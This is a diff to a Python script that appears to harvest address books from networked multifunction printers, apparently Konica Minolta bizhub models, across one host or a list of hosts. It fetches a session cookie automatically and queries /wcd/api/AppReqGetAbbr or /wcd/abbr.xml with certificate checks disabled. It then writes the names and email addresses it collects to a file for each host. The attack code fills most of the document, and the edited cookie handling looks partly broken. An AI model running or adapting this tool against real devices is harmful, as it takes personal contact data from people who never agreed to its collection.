@@ -20,21 +20,9 @@ def parse_args():
     group.add_argument("--ip", help="Single IP or hostname.")
     group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")
 
-    parser.add_argument(
-        "-c", "--cookie",
-        default=None,
-        help="If you already have a valid 'ID=...' cookie, supply it here. Otherwise, the script auto-fetches."
-    )
-    parser.add_argument(
-        "-n", "--names",
-        action="store_true",
-        help="If set, also dump the list of user names (in addition to emails)."
-    )
-    parser.add_argument(
-        "-d", "--debug",
-        action="store_true",
-        help="Print debug info, including response details and cookie info."
-    )
+    parser.add_argument("-c", "--cookie", default=None, help="If you already have a valid 'ID=...' cookie, supply it here.")
+    parser.add_argument("-n", "--names", action="store_true", help="If set, also dump the list of user names (in addition to emails).")
+    parser.add_argument("-d", "--debug", action="store_true", help="Print debug info, including response details and cookie info.")
     return parser.parse_args()
 
 def auto_get_cookie(host, debug=False):
@@ -69,59 +57,27 @@ def auto_get_cookie(host, debug=False):
 
 def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, start=1, end=50, debug=False):
     """
-    Fetch one chunk (start..end) from /wcd/api/AppReqGetAbbr.
-    Uses the working protocol.
+    Fetch one chunk (start..end) from /wcd/abbr.xml using the detected working protocol.
     """
-    url = f"{protocol}://{host}/wcd/api/AppReqGetAbbr"
-
-    payload = {
-        "AbbrListCondition": {
-            "WellUse": "false",
-            "SearchKey": "None",
-            "ObtainCondition": {
-                "Type": "IndexList",
-                "IndexRange": {
-                    "Start": start,
-                    "End": end
-                }
-            },
-            "SortInfo": {
-                "Condition": "No",
-                "Order": "Ascending"
-            },
-            "AddressKind": "Public",
-            "SearchSendMode": "0"
-        }
-    }
+    url = f"{protocol}://{host}/wcd/abbr.xml"
 
     try:
+        headers = {'Cookie': cookie_value} if cookie_value else session.cookies.get_dict()
         if session:
             if debug:
                 print(f"[DEBUG] Fetching {start}-{end} using session cookie(s) over {protocol.upper()}.")
-            resp = session.post(url, json=payload, verify=False, timeout=15)
+            resp = session.get(url, headers=headers, verify=False, timeout=15)
         else:
-            cookie_dict = {}
-            if cookie_value:
-                val = cookie_value
-                if val.startswith("ID="):
-                    val = val[3:]
-                cookie_dict["ID"] = val.strip()
-
             if debug:
-                print(f"[DEBUG] Fetching {start}-{end} over {protocol.upper()} with cookie:", cookie_dict)
-            resp = requests.post(url, json=payload, cookies=cookie_dict, verify=False, timeout=15)
+                print(f"[DEBUG] Fetching {start}-{end} over {protocol.upper()} with cookie:", headers)
+            resp = requests.get(url, headers=headers, verify=False, timeout=15)
 
         if debug:
             print(f"[DEBUG] chunk {start}-{end} -> HTTP {resp.status_code}")
             print("[DEBUG] Response body:", resp.text[:400] + ("..." if len(resp.text) > 400 else ""))
 
         if resp.status_code == 200:
-            try:
-                return resp.json()
-            except json.JSONDecodeError:
-                if debug:
-                    print("[DEBUG] JSON decode error for chunk", start, end)
-                return None
+            return resp.text  # Return raw XML response
         else:
             if debug:
                 print("[DEBUG] Non-200 status code:", resp.status_code)
@@ -134,52 +90,45 @@ def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, start=1, e
 
 def fetch_all_abbr(host, protocol, session=None, debug=False):
     """
-    Fetch all address entries in chunks using the detected working protocol.
+    Fetch the entire address book using the working protocol.
     """
-    all_abbr = []
-    current_start = 1
-
-    data = fetch_abbr_chunk(host, protocol, session=session, start=current_start,
-                            end=current_start + CHUNK_SIZE - 1, debug=debug)
-    if not data:
+    raw_xml = fetch_abbr_chunk(host, protocol, session=session, debug=debug)
+    if not raw_xml:
         return ([], 0)
 
-    abbr_list_data = data.get("MFP", {}).get("AbbrList", {})
-    total_size = int(abbr_list_data.get("ArraySize", "0"))
+    # Process the XML response
+    from xml.etree import ElementTree as ET
+    try:
+        root = ET.fromstring(raw_xml)
+        abbr_list = root.find(".//Address/AbbrList")
 
-    first_chunk_abbr = abbr_list_data.get("Abbr", [])
-    all_abbr.extend(first_chunk_abbr)
+        if abbr_list is None:
+            if debug:
+                print(f"[DEBUG] No <AbbrList> found inside <Address> for {host}.")
+            return ([], 0)
 
-    while len(first_chunk_abbr) == CHUNK_SIZE and (total_size > len(all_abbr)):
-        current_start += CHUNK_SIZE
-        next_end = current_start + CHUNK_SIZE - 1
+        contacts = []
+        for addr in abbr_list.findall("AddressKind"):
+            name_element = addr.find("Name")
+            name = name_element.text.strip() if name_element is not None else "Unknown"
 
-        data = fetch_abbr_chunk(host, protocol, session=session, start=current_start, end=next_end, debug=debug)
-        if not data:
-            break
+            send_config = addr.find("SendConfiguration")
+            email = "No Email"
+            if send_config is not None:
+                to_element = send_config.find("To")
+                email = to_element.text.strip() if to_element is not None else "No Email"
 
-        chunk_abbr = data.get("MFP", {}).get("AbbrList", {}).get("Abbr", [])
-        all_abbr.extend(chunk_abbr)
+            contacts.append((name, email))
 
-    return (all_abbr, total_size)
+            if debug:
+                print(f"[DEBUG] Extracted Name: {name}, Email: {email}")
 
-def extract_names_and_emails(abbr_entries):
-    """
-    Extracts names and emails from address book entries.
-    """
-    names = []
-    emails = []
+        return contacts, len(contacts)
 
-    for entry in abbr_entries:
-        name = entry.get("Name", "").strip()
-        to_email = entry.get("SendConfiguration", {}).get("AddressInfo", {}).get("EmailMode", {}).get("To", "").strip()
-
-        if name:
-            names.append(name)
-        if to_email:
-            emails.append(to_email)
-
-    return (names, emails)
+    except ET.ParseError as e:
+        if debug:
+            print(f"[DEBUG] XML parsing error for {host}: {e}")
+        return ([], 0)
 
 def process_host(host, debug=False):
     """Handles the full address book extraction for a single host."""
@@ -187,24 +136,18 @@ def process_host(host, debug=False):
     if not session:
         return
 
-    abbr_list, array_size = fetch_all_abbr(host, protocol, session=session, debug=debug)
+    abbr_list, total_entries = fetch_all_abbr(host, protocol, session=session, debug=debug)
 
     if not abbr_list:
         print(f"[!] No address book entries found for {host}.")
         return
 
-    names, emails = extract_names_and_emails(abbr_list)
+    output_file = f"{host}_addrbook.txt"
+    with open(output_file, "w", encoding="utf-8") as f:
+        for name, email in abbr_list:
+            f.write(f"{name},{email}\n")
 
-    if not emails:
-        print(f"[!] No email addresses found for {host}.")
-        return
-
-    email_filename = f"bizhub-addrBk_emailAddr_{host}.txt"
-    with open(email_filename, "w", encoding="utf-8") as f:
-        for em in sorted(set(emails)):
-            f.write(em + "\n")
-
-    print(f"[+] Extracted {len(emails)} email addresses from {host} -> {email_filename}")
+    print(f"[+] Extracted {len(abbr_list)} records from {host} -> {output_file}")
 
 def main():
     parser = parse_args()
